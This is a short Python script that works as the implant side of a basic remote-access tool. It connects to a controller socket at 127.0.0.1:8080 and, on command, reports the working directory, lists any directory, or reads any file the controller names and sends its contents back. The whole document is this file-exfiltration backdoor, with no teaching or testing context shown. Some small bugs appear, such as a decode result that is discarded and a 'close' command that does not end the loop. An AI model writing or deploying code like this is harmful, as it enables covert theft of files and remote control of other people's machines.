import socket
import sys
import os
try:
    cs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
except socket.error as err:
    print("socket failed to make")
    print("reason %s" %str(err))
    sys.exit()

target_host='127.0.0.1'
target_port= 8080
try:
    cs.connect((target_host,int(target_port)))
except socket.error as err:
    print("the socket failed to connect!")

while True:
    command=cs.recv(1024)
    command.decode('ascii')

    if command == b'cwd':
        file=os.getcwd()
        file=str(file)
        cs.send(file.encode('ascii'))

    elif command == b'ls':
        user_path=cs.recv(5000)
        user_path=user_path.decode('ascii')
        files=os.listdir(user_path)
        files=str(files)
        cs.send(files.encode('ascii'))

    elif command == b'download':
        file_path=cs.recv(5000)
        file_path=file_path.decode('ascii')
        file=open(file_path,"rb")
        data=file.read()
        cs.send(data)

    elif command== b'close':
        cs.close()

    else:
        print('command not recognised')
